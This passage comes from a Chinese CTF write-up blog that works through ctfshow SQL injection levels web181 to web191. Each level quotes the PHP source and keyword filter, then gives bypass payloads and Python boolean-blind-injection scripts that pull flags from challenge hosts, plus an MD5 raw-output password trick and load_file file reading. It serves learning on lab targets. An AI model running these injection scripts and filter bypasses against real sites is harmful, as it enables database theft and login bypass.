class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题对大部分绕过空格的都做了过滤，同时大小写的关键字<strong>select</strong>均被过滤</p><p>考虑在原本的sql语句上加特定条件</p><p>paylaod为<code>-1&#39;or(username)=&#39;flag</code></p><h3 id="web182（通配符绕过）"><a href="#web182（通配符绕过）" class="headerlink" title="web182（通配符绕过）"></a>web182（通配符绕过）</h3><p>源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题多过滤了<code>flag</code>，那么我们可以考虑使用通配符%来绕过</p><p>payload为<code>-1&#39;or(username)like&#39;f%</code></p><h3 id="web183（布尔盲注1）"><a href="#web183（布尔盲注1）" class="headerlink" title="web183（布尔盲注1）"></a>web183（布尔盲注1）</h3><p>源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select count(pass) from &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;tableName&#x27;</span>].<span class="string">&quot;;&quot;</span>;</span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回用户表的记录总数</span></span><br><span class="line"><span class="variable">$user_count</span> = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>本题将or给过滤了，同时sql语句也发生了变化，返回的内容不再是数据的内容，而是内容的数量，很符合盲注的条件</p><p>所以我们考虑使用布尔盲注</p><p>从头盲注代码量太大，这里我们利用之前题目的信息，确定表名是<code>ctfshow_user</code></p><p>而题目以及提示字段名为<code>pass</code>，所以我们直接判断数据项的内容即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;http://221413c4-c7b2-4e59-8ad0-bf9a144652c3.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">strlist = <span class="string">&#x27;&#123;&#125;0123456789-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strlist:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&quot;`ctfshow_user`where`pass`like&#x27;ctfshow&#123;&#125;%&#x27;&quot;</span>.<span class="built_in">format</span>(flag+i)</span><br><span class="line">        &#125;</span><br><span class="line">        respond = requests.post(url, data=data)</span><br><span class="line">        respond = respond.text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;user_count = 1&#x27;</span> <span class="keyword">in</span> respond:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;--------------------正确&#x27;</span>,i)</span><br><span class="line">            flag += i</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;ctfshow&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:exit()   <span class="comment">#判断 flag 是否获取完整</span></span><br></pre></td></tr></table></figure><h3 id="web184（布尔盲注2）"><a href="#web184（布尔盲注2）" class="headerlink" title="web184（布尔盲注2）"></a>web184（布尔盲注2）</h3><p>源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;select count(*) from &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;tableName&#x27;</span>].<span class="string">&quot;;&quot;</span>;</span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回用户表的记录总数</span></span><br><span class="line"><span class="variable">$user_count</span> = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>相比于上一题，本题将where和sleep等关键词过滤，说明不允许使用时间盲注</p><p>而关键字<code>where + like</code>可以使用<code>group by + having</code>来替代</p><p>最后是单双引号都被禁用，我们可以将字段值用16进制来表示，这样可以避免使用引号</p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;http://5bbff075-99dc-4ee3-8ec4-493b37b510b5.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr=<span class="string">&quot;ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_&quot;</span>   <span class="comment">#40</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;ctfshow_user group by pass having pass like 0x63746673686f777b&#123;&#125;25&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> flag+x))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#print(data)</span></span><br><span class="line">        response=requests.post(url,data=data)</span><br><span class="line">        <span class="comment">#有并发数量限制的，就睡一段时间</span></span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> response.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;++++++++++++++++ &#123;&#125; is right&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ctfshow&#123;&quot;</span>+flag)</span><br><span class="line">    <span class="keyword">if</span>(flag[-<span class="number">1</span>]==<span class="string">&quot;&#125;&quot;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="web185（布尔盲注3）"><a href="#web185（布尔盲注3）" class="headerlink" title="web185（布尔盲注3）"></a>web185（布尔盲注3）</h3><p>源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select count(*) from &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;tableName&#x27;</span>].<span class="string">&quot;;&quot;</span>;</span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回用户表的记录总数</span></span><br><span class="line"><span class="variable">$user_count</span> = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>本题将所有数字都给过滤</p><p>我们可以通过<code>true+true+……</code>的方法构造数字</p><p>只需在前一题脚本中加上下面的替换函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">formatString</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    temp=<span class="string">&quot;concat(&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        tip=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> string.digits:</span><br><span class="line">            tmp=<span class="built_in">int</span>(x)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tip=<span class="number">1</span></span><br><span class="line">            temp+=<span class="string">&quot;char(&quot;</span></span><br><span class="line">            tmp=<span class="built_in">ord</span>(x)</span><br><span class="line">        <span class="keyword">if</span> tmp == <span class="number">0</span>:</span><br><span class="line">            temp+=<span class="string">&quot;false&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            temp_d=<span class="string">&quot;(&quot;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,tmp):</span><br><span class="line">                temp_d+=<span class="string">&quot;true+&quot;</span></span><br><span class="line">            temp_d=temp_d[:-<span class="number">1</span>]+<span class="string">&quot;)&quot;</span></span><br><span class="line">            <span class="keyword">if</span> tip==<span class="number">1</span>:</span><br><span class="line">                temp_d+=<span class="string">&quot;)&quot;</span></span><br><span class="line">            temp+=temp_d</span><br><span class="line">        temp+=<span class="string">&quot;,&quot;</span></span><br><span class="line">    <span class="comment"># 去掉最后一个逗号，将其改为反括号</span></span><br><span class="line">    temp=temp[:-<span class="number">1</span>]+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> temp</span><br></pre></td></tr></table></figure><img src="/posts/7161e1c54a15/image-20240428170602136.png" class="" title="image-20240428170602136"><h3 id="web186（布尔盲注4）"><a href="#web186（布尔盲注4）" class="headerlink" title="web186（布尔盲注4）"></a>web186（布尔盲注4）</h3><p>源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;select count(*) from &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;tableName&#x27;</span>].<span class="string">&quot;;&quot;</span>;</span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\&gt;|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//返回用户表的记录总数</span></span><br><span class="line"><span class="variable">$user_count</span> = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>本关将<code>%</code>、<code>&gt;</code>、<code>&lt;</code>、<code>^</code>给过来了，不过由于我们的盲注脚本使用的是<code>regexp()</code>匹配，所以不影响</p><h3 id="web187（md5）"><a href="#web187（md5）" class="headerlink" title="web187（md5）"></a>web187（md5）</h3><p><code>$password = md5($_POST[&#39;password&#39;],true);</code></p><p>我们需要了解一下md5()函数中，设置true参数有什么用</p><p>string md5( string $str[, bool $raw_output = false] )</p><ul><li>raw_output：如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。</li></ul><p>那么当我们输入的password参数内容在计算md5哈希值后，会将哈希值根据转为原始二进制数据的字符串</p><p>此时我们可以通过精心构造输入，例如<code>ffifdyop</code></p><p>它在经过md5函数后会得到<code>&#39;or&#39;6�]��!r,��b</code></p><img src="/posts/7161e1c54a15/image-20240428173634700.png" class="" title="image-20240428173634700"><p>那么就可以作为万能密码来使用</p><img src="/posts/7161e1c54a15/image-20240428174035041.png" class="" title="image-20240428174035041"><h3 id="web188（弱类型比较）"><a href="#web188（弱类型比较）" class="headerlink" title="web188（弱类型比较）"></a>web188（弱类型比较）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>&quot;</span>;  </span><br><span class="line"><span class="comment">//用户名检测</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#x27;|\&quot;/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//密码检测</span></span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//密码判断</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="title function_ invoke__">intval</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">      <span class="title function_ invoke__">array_push</span>(<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>], <span class="keyword">array</span>(<span class="string">&#x27;flag&#x27;</span>=&gt;<span class="variable">$flag</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>本关中限制密码为纯数字</p><p>那么我们可以利用php和sql中的弱类型比较特性</p><p>当我们在username处输入0，那么该SQL语句会返回找到的第一个用户名为<strong>纯字母字符串或者第一个字符为0</strong>的数据项的密码</p><p>而当我们在密码栏填入0，那么在进行<code>$row[&#39;pass&#39;]==intval($password)</code>这一语句的比较时，同样会应用弱类型比较的特点，如果密码的第一个字符为字母或0，那么就会判为相等</p><h3 id="web189（构造盲注注入点）"><a href="#web189（构造盲注注入点）" class="headerlink" title="web189（构造盲注注入点）"></a>web189（构造盲注注入点）</h3><p>题目提示<code>flag在api/index.php文件中</code></p><p>那么我们可以通过<code>load_file</code>读取文件，以用户名处作为注入点</p><p>由于无回显，我们尝试使用盲注</p><p>在密码处我们随便填一个数字</p><p>那么此时就会产生两种回显：</p><ol><li>username=0，返回“密码错误”。</li><li>username=1，返回“查询失败”。</li></ol><p>相当于username参数的不同布尔值返回不同结果，可以使用布尔盲注</p><p>记录一下页面回显中的不同处</p><img src="/posts/7161e1c54a15/image-20240428191333690.png" class="" title="image-20240428191333690"><img src="/posts/7161e1c54a15/image-20240428191356565.png" class="" title="image-20240428191356565"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Author:Kradress</span></span><br><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> concat</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://7a230a5a-ef27-4fa1-b68b-cb73e8c6aa2e.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">uuid = string.digits+string.ascii_lowercase+<span class="string">&quot;-&#125;&quot;</span></span><br><span class="line">passwd = <span class="string">&quot;if(load_file(&#x27;/var/www/html/api/index.php&#x27;)regexp(&#x27;ctfshow&#123;&quot;</span> <span class="comment">#ctfshow&#123;</span></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> uuid:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span> : passwd + <span class="string">f&quot;<span class="subst">&#123;char&#125;</span>&#x27;),0,1)&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span> : <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            passwd += char</span><br><span class="line">            flag += char</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> passwd[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><img src="/posts/7161e1c54a15/image-20240429184537243.png" class="" title="image-20240429184537243"><h3 id="web190（布尔盲注）"><a href="#web190（布尔盲注）" class="headerlink" title="web190（布尔盲注）"></a>web190（布尔盲注）</h3><p>和上一题一样，盲注的注入点在用户名处</p><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> concat</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://c4078d3f-26b4-4a46-8cee-fff64a032d22.challenge.ctf.show/api/&#x27;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow_fl0g,ctfshow_user</span></span><br><span class="line"><span class="comment"># payload = &quot;0&#x27; or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,1,0) -- &quot;</span></span><br><span class="line"><span class="comment"># 列名 id,f1ag,id,username,pass</span></span><br><span class="line"><span class="comment"># payload = &quot;0&#x27; or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,1,0) -- &quot;</span></span><br><span class="line"><span class="comment"># 详细值</span></span><br><span class="line"><span class="comment"># payload = &quot;0&#x27; or if(ascii(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&gt;&#123;&#125;,1,0) -- &quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload  = <span class="string">&quot;0&#x27; or if(ascii(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&gt;&#123;&#125;,1,0) -- &quot;</span></span><br><span class="line">true_flag = <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    end = <span class="number">255</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (<span class="built_in">abs</span>(start-end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        p = (start + end) // <span class="number">2</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: payload.<span class="built_in">format</span>(index, p),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = requests.post(url, data=data)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> true_flag <span class="keyword">in</span> response.text:</span><br><span class="line">            start = p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    <span class="keyword">if</span> end == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>首先通过<code>information_schema.tables</code>获取所有的表名</p><p><code>0&#39; or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,1,0) --</code></p><img src="/posts/7161e1c54a15/image-20240430164055019.png" class="" title="image-20240430164055019"><p>接下来获取<code>ctfshow_fl0g</code>表中的字段</p><p><code>0&#39; or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,1,0) --</code></p><img src="/posts/7161e1c54a15/image-20240430164443447.png" class="" title="image-20240430164443447"><p>flag应该在<code>f1ag</code>字段中，爆破其中的flag</p><img src="/posts/7161e1c54a15/image-20240430164908094.png" class="" title="image-20240430164908094"><h3 id="web191（布尔盲注-过滤1）"><a href="#web191（布尔盲注-过滤1）" class="headerlink" title="web191（布尔盲注+过滤1）"></a>web191（布尔盲注+过滤1）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|ascii/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span 